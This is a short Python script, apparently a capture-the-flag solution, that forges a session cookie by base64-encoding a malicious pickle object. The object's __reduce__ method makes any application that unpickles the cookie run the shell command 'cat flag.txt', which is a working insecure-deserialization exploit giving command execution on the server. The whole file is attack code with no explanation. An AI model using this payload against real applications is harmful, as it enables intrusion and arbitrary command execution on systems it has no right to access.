import pickle
import base64
import os
class exploit:
  def __reduce__(self):
    return (os.system, ('cat flag.txt',))

fake_object = exploit()
session_cookie = base64.b64encode(pickle.dumps(fake_object))
print(session_cookie)
